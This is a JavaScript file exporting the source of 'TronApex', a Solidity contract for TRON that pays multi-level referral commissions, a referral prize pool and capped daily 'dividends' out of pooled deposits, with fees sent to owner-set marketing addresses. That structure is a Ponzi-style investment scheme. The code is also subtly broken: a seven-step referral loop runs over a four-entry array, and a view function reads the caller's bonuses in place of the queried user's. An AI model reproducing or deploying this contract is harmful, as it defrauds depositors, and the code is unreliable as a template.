export const code = `
pragma solidity 0.5.9;

contract TronApex {
	using SafeMath for uint256;
	
	uint256 constant public MinimumInvest = 100 trx;
	uint256 constant public MarketingFee = 800;
	uint256 constant public ServiceFee = 300;
	uint256[] public ReferralCommissions = [500, 200, 50, 50];
	uint256[] public ReferralBonusRewards = [1000 trx, 5000 trx, 10000 trx, 20000 trx, 50000 trx];
	uint256[] public ReferralPoolPercents = [3000, 2000, 1500, 800, 700, 600, 500, 400, 300, 200];
	uint256 constant public Day = 1 days;
	uint256 constant public RefComDay = 2 days;
	uint256 constant public HoldDay = 10 days;
	uint256 constant public ROICap = 32000;
	uint256 constant public PercentDiv = 10000;
	uint256 constant public RefPoolBonus = 100;
	uint256 constant public RefPoolGoal = 100000 trx;
	uint256 constant public MaxDepositLimit = 1000000 trx;
	uint256 constant public ContractBonus = 100;
	uint256 constant public HoldBonusCap = 200;
	uint256 constant public WithdrawalCommissionsRule = 50000 trx;
	uint256 constant public WithdrawalDividendsRuleOne = 25000 trx;
	uint256 constant public WithdrawalDividendsRuleOneMax = 250000 trx;
	uint256 constant public WithdrawalDividendsRuleTwo = 50000 trx;
	uint256 constant public WithdrawalDividendsRuleTwoMax = 500000 trx;
	uint256 constant public WithdrawalDividendsRuleThree = 100000 trx;
	uint256 constant public WithdrawalDividendsRuleThreeMax = 1000000 trx;
	
	uint256 public TotalInvestors;
	uint256 public TotalInvested;
	uint256 public TotalWithdrawn;
	uint256 public TotalDepositCount;
	uint256 public RefPool;
	uint256 public RefPoolID;
	uint256 public Locked;
	
	address payable public MarketingFeeAddress;
	address payable public MarketingFeeAddressPromo;
	address payable public ServiceFeeAddress;

    mapping(uint256 => mapping(address => uint256)) public	RefPoolSum;
    mapping(uint256 => address payable) public topRefPool;

	struct Deposit {
		uint256 amount;
		uint256 withdrawn;
		uint256 start;
	}
	
	struct Commissions {
		address Downline;
		uint256 Earned;
		uint256 Invested;
		uint256 Level;
		uint256 DepositTime;
	}
	
	struct User {
		Deposit[] deposits;
		Commissions[] commissions;
		uint256 checkpoint;
		uint256 WithdrawDivTime;
		uint256 WithdrawComTime;
		uint256 ActiveBonus;
		address payable upline;
		uint256 totalinvested;
		uint256 totalwithdrawn;
		uint256 RefPoolScore;
		uint256 RefPoolID;
		uint256 totalcommisions;
		uint256 lvlonecommisions;
		uint256 lvltwocommisions;
		uint256 lvlthreecommisions;
		uint256 lvlfourcommisions;
		uint256 availablecommisions;
	}
	
	mapping (address => User)   internal users;
	
	event ReferralBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawal(address indexed user, uint256 amount);
	event RefPoolPrize(address indexed user, uint256 amount, uint256 place);
	
	constructor(address payable MarketingAddress,address payable MarketingAddressPromo, address payable ServiceAddress) public {
		MarketingFeeAddress = MarketingAddress;
		ServiceFeeAddress = ServiceAddress;
		MarketingFeeAddressPromo = MarketingAddressPromo;
		RefPool = 0;
		RefPoolID = 0;
		Locked = 0;
	}
	
	
	function Invest(address payable InvestorUpline) public payable {
		require(msg.value >= MinimumInvest);
		require(!isContract(msg.sender));
		User storage user = users[msg.sender];
		require(user.deposits.length < 200);
		require(user.totalinvested <= MaxDepositLimit);
		uint256 TransferValue = msg.value;
		uint256 availableLimit = MaxDepositLimit.sub(user.totalinvested);
		
        if (TransferValue > availableLimit) {
            msg.sender.transfer(TransferValue.sub(availableLimit));
            TransferValue = availableLimit;
        }
		
		MarketingFeeAddress.transfer(TransferValue.mul(MarketingFee.div(2)).div(PercentDiv));
		MarketingFeeAddressPromo.transfer(TransferValue.mul(MarketingFee.div(2)).div(PercentDiv));
		ServiceFeeAddress.transfer(TransferValue.mul(ServiceFee).div(PercentDiv));
		
		if (user.upline == address(0) && users[InvestorUpline].deposits.length > 0 && InvestorUpline != msg.sender) {
			user.upline = InvestorUpline;
		}
		if (user.upline != address(0)) {
			address upline = user.upline;
			for (uint256 i = 0; i < 7; i++) {
				if (upline != address(0)) {
					uint256 amount = TransferValue.mul(ReferralCommissions[i]).div(PercentDiv);
					users[upline].totalcommisions = users[upline].totalcommisions.add(amount);
					users[upline].availablecommisions = users[upline].availablecommisions.add(amount);
					if(i == 0){
						users[upline].lvlonecommisions = users[upline].lvlonecommisions.add(amount);
						if(users[upline].RefPoolID == RefPoolID){
							users[upline].RefPoolScore = users[upline].RefPoolScore.add(TransferValue);
						}else{
							users[upline].RefPoolScore = 0;
							users[upline].RefPoolID = RefPoolID;
							users[upline].RefPoolScore = users[upline].RefPoolScore.add(TransferValue);
						}
						elaborateRefPool(user.upline, TransferValue);
					}
					if(i == 1){
						users[upline].lvltwocommisions = users[upline].lvltwocommisions.add(amount);
					}
					if(i == 2){
						users[upline].lvlthreecommisions = users[upline].lvlthreecommisions.add(amount);
					}
					if(i == 3){
						users[upline].lvlfourcommisions = users[upline].lvlfourcommisions.add(amount);
					}
					users[upline].commissions.push(Commissions(msg.sender, amount, TransferValue, i, block.timestamp));
					emit ReferralBonus(upline, msg.sender, i, amount);
					upline = users[upline].upline;
				} else break;
			}
			
		}
		if (user.upline == address(0)) {
			uint256 advertise = 800;
			MarketingFeeAddress.transfer(TransferValue.mul(advertise).div(PercentDiv));
		}
		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			TotalInvestors = TotalInvestors.add(1);
		}
		RefPool = RefPool.add(TransferValue.mul(RefPoolBonus).div(PercentDiv));
		if(RefPool >= RefPoolGoal && Locked == 0){
			FinishRefPool();
		}
		user.deposits.push(Deposit(TransferValue, 0, block.timestamp));
		user.totalinvested = user.totalinvested.add(TransferValue);
		TotalDepositCount = TotalDepositCount.add(1);
		TotalInvested = TotalInvested.add(TransferValue);
		emit NewDeposit(msg.sender, TransferValue);
	}
	
	function WithdrawCommissions() public {
		User storage user = users[msg.sender];
		uint256 contractBalance = address(this).balance;
		uint256 toSend;
		uint256 RefCommissions;
		uint256 LeftCommissions;
		require(user.availablecommisions > 0, "No commissions available");
		require(((now.sub(user.WithdrawComTime)).div(RefComDay)) > 0 || user.WithdrawComTime == 0, "48 Hours not passed");
		RefCommissions = user.availablecommisions;
		if(user.availablecommisions > WithdrawalCommissionsRule){
			RefCommissions = WithdrawalCommissionsRule;
			LeftCommissions = user.availablecommisions.sub(WithdrawalCommissionsRule);
		}
		if (contractBalance < RefCommissions) {
			toSend = contractBalance;
			user.availablecommisions = RefCommissions.sub(toSend);
		}else{
			toSend = RefCommissions;
			user.availablecommisions = LeftCommissions;
		}
		user.WithdrawComTime = block.timestamp;
		msg.sender.transfer(toSend);
		TotalWithdrawn = TotalWithdrawn.add(toSend);
		
		emit Withdrawal(msg.sender, toSend);
	}
	
	function WithdrawDividends() public {
		User storage user = users[msg.sender];
		require(((now.sub(user.WithdrawDivTime)).div(Day)) > 0 || user.WithdrawDivTime == 0, "24 Hours not passed");
		require(user.commissions.length > 0, "You need atleast 1 referral");
		uint256 userPercentRate = ContractBonus.add(GetHoldBonus(msg.sender)).add(GetRefBonus(msg.sender)).add(GetActiveBonus(msg.sender));
		uint256 toSend;
		uint256 dividends;
		uint256 ActiveBonus;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			if (user.deposits[i].withdrawn < ((user.deposits[i].amount.mul(ROICap)).div(PercentDiv))) {
				if (user.deposits[i].start > user.checkpoint) {
					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PercentDiv))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(Day);
					ActiveBonus = ActiveBonus.add(1);
				} else {
					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PercentDiv))
						.mul(block.timestamp.sub(user.checkpoint))
						.div(Day);
					ActiveBonus = ActiveBonus.add(1);
				}
				if (user.deposits[i].withdrawn.add(dividends) >= ((user.deposits[i].amount.mul(ROICap)).div(PercentDiv))) {
					dividends = (((user.deposits[i].amount.mul(ROICap)).div(PercentDiv))).sub(user.deposits[i].withdrawn);
					ActiveBonus = 0;
				}
				
				if(user.totalinvested < WithdrawalDividendsRuleOneMax){
					if(toSend <= WithdrawalDividendsRuleOne){
						if(toSend.add(dividends) >= WithdrawalDividendsRuleOne){
							uint256 Overkill = toSend.add(dividends).sub(WithdrawalDividendsRuleOne);
							dividends = dividends.sub(Overkill);
						}
					} else break;
				}
				if(user.totalinvested > WithdrawalDividendsRuleOneMax && user.totalinvested < WithdrawalDividendsRuleTwoMax){
					if(toSend <= WithdrawalDividendsRuleTwo){
						if(toSend.add(dividends) >= WithdrawalDividendsRuleTwo){
							uint256 Overkill = toSend.add(dividends).sub(WithdrawalDividendsRuleTwo);
							dividends = dividends.sub(Overkill);
						}
					} else break;
				}
				if(user.totalinvested > WithdrawalDividendsRuleTwoMax){
					if(toSend <= WithdrawalDividendsRuleThree){
						if(toSend.add(dividends) >= WithdrawalDividendsRuleThree){
							uint256 Overkill = toSend.add(dividends).sub(WithdrawalDividendsRuleThree);
							dividends = dividends.sub(Overkill);
						}
					} else break;
				}
				user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends);
				toSend = toSend.add(dividends);
			}
		}

		require(toSend > 0, "No dividends available");

		uint256 contractBalance = address(this).balance;
		if (contractBalance < toSend) {
			toSend = contractBalance;
		}
		user.checkpoint = block.timestamp;
		if(ActiveBonus != 0){
			user.ActiveBonus = 1;
		}
		user.WithdrawDivTime = block.timestamp;
		msg.sender.transfer(toSend);
		TotalWithdrawn = TotalWithdrawn.add(toSend);
		user.totalwithdrawn = user.totalwithdrawn.add(toSend);
		emit Withdrawal(msg.sender, toSend);
	}
	
	
	function GetUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
		uint256 userPercentRate = ContractBonus.add(GetHoldBonus(msg.sender)).add(GetRefBonus(msg.sender)).add(GetActiveBonus(msg.sender));
		uint256 totalDividends;
		uint256 dividends;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			if (user.deposits[i].withdrawn < ((user.deposits[i].amount.mul(ROICap)).div(PercentDiv))) {
				if (user.deposits[i].start > user.checkpoint) {
					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PercentDiv))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(Day);
				} else {
					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PercentDiv))
						.mul(block.timestamp.sub(user.checkpoint))
						.div(Day);
				}
				if (user.deposits[i].withdrawn.add(dividends) > ((user.deposits[i].amount.mul(ROICap)).div(PercentDiv))) {
					dividends = ((user.deposits[i].amount.mul(ROICap)).div(PercentDiv)).sub(user.deposits[i].withdrawn);
				}
				totalDividends = totalDividends.add(dividends);
			}
		}
		return totalDividends;
	}
	
	function ActiveClient(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];
		if (user.deposits.length > 0) {
			if (user.deposits[user.deposits.length-1].withdrawn < ((user.deposits[user.deposits.length-1].amount.mul(ROICap)).div(PercentDiv))) {
				return true;
			}
		}
	}
	
    function GetHoldBonus(address userAddress) public view returns (uint256) {
        User storage user = users[userAddress];
        if (user.checkpoint > 0) {
            uint256 timeMultiplier = ((now.sub(user.checkpoint)).div(HoldDay)).mul(50);
            if(timeMultiplier > HoldBonusCap){
                timeMultiplier = HoldBonusCap;
            }
            return timeMultiplier;
        }else{
            return 0;
        }
    }
	
    function GetActiveBonus(address userAddress) public view returns (uint256) {
        User storage user = users[userAddress];
        if (user.ActiveBonus == 0) {
            uint256 ActiveBonus = TotalInvestors.mul(400).div(PercentDiv);
            return ActiveBonus;
        }else{
            return 0;
        }
    }
	
    function GetRefBonus(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
		uint256 bonus = 0;
		uint256 commissionsTotal = user.lvlonecommisions.mul(PercentDiv).div(ReferralCommissions[0]);
		if (commissionsTotal >= ReferralBonusRewards[0] && commissionsTotal <= ReferralBonusRewards[1]) {
            bonus = 5;
        } else if (commissionsTotal >= ReferralBonusRewards[1] && commissionsTotal <= ReferralBonusRewards[2]) {
            bonus = 10;
        } else if (commissionsTotal >= ReferralBonusRewards[2] && commissionsTotal <= ReferralBonusRewards[3]) {
            bonus = 50;
        } else if (commissionsTotal >= ReferralBonusRewards[3] && commissionsTotal <= ReferralBonusRewards[4]) {
            bonus = 75;
        } else if (commissionsTotal >= ReferralBonusRewards[4]) {
            bonus = 100;
        }
        return bonus;
    }
	
	function FinishRefPool() internal {
		Locked = 1;
		
        for(uint256 i = 0; i < ReferralPoolPercents.length; i++) {
            if(topRefPool[i] == address(0)) break;
			
			topRefPool[i].transfer(RefPool.mul(ReferralPoolPercents[i]).div(PercentDiv));
			emit RefPoolPrize(topRefPool[i], RefPool.mul(ReferralPoolPercents[i]).div(PercentDiv), i);
        }
        
        for(uint256 i = 0; i < ReferralPoolPercents.length; i++) {
            topRefPool[i] = address(0);
        }
		
		RefPool = 0;
		RefPoolID = RefPoolID.add(1);
		Locked = 0;
	}

	function elaborateRefPool(address payable addr, uint256 currentValue) private {
		
		RefPoolSum[RefPoolID][addr] += currentValue;
		
        for(uint256 i = 0; i < ReferralPoolPercents.length; i++) {
            if(topRefPool[i] == addr) break;

            if(topRefPool[i] == address(0)) {
                topRefPool[i] = addr;
                break;
            }

            if(RefPoolSum[RefPoolID][addr] > RefPoolSum[RefPoolID][topRefPool[i]]) {
                for(uint256 j = i + 1; j < ReferralPoolPercents.length; j++) {
                    if(topRefPool[j] == addr) {
                        for(uint256 k = j; k <= ReferralPoolPercents.length; k++) {
                            topRefPool[k] = topRefPool[k + 1];
                        }
                        break;
                    }
                }

                for(uint256 j = uint256(ReferralPoolPercents.length - 1); j > i; j--) {
                    topRefPool[j] = topRefPool[j - 1];
                }

                topRefPool[i] = addr;

                break;
            }
        }
	}
	
	function GetTotalCommission(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];
		return (user.commissions.length);
	}

	function GetUserCommission(address userAddress, uint256 index) public view returns(address, uint256, uint256, uint256, uint256) {
	    User storage user = users[userAddress];
		return (user.commissions[index].Downline, user.commissions[index].Earned, user.commissions[index].Invested, user.commissions[index].Level, user.commissions[index].DepositTime);
	}

	function GetUserData(address userAddress) public view returns(address, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256) {
	    User storage user = users[userAddress];
		return (user.upline, user.totalinvested, user.totalwithdrawn, user.totalcommisions, user.lvlonecommisions, user.availablecommisions, user.checkpoint, user.WithdrawDivTime, user.WithdrawComTime, user.ActiveBonus);
	}
	
	function GetUserTotalDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}
	
	function GetUserDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256) {
	    User storage user = users[userAddress];
		return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start);
	}
	
	function GetContractBalance() public view returns (uint256) {
		return address(this).balance;
	}
	
	function RefPoolTopAddr(uint256 index) public view returns (address) {
		return topRefPool[index];
	}

	function RefPoolTopValue(uint256 index) public view returns (uint256) {
		return RefPoolSum[RefPoolID][topRefPool[index]];
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
	
}

library SafeMath {
	
	function fxpMul(uint256 a, uint256 b, uint256 base) internal pure returns (uint256) {
		return div(mul(a, b), base);
	}
		
	function add(uint256 a, uint256 b) internal pure returns (uint256) {
		uint256 c = a + b;
		require(c >= a, "SafeMath: addition overflow");
		return c;
	}

	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
		require(b <= a, "SafeMath: subtraction overflow");
		uint256 c = a - b;
		return c;
	}

	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
		if (a == 0) {
			return 0;
		}
		uint256 c = a * b;
		require(c / a == b, "SafeMath: multiplication overflow");
		return c;
	}

	function div(uint256 a, uint256 b) internal pure returns (uint256) {
		require(b > 0, "SafeMath: division by zero");
		uint256 c = a / b;
		return c;
	}
}`;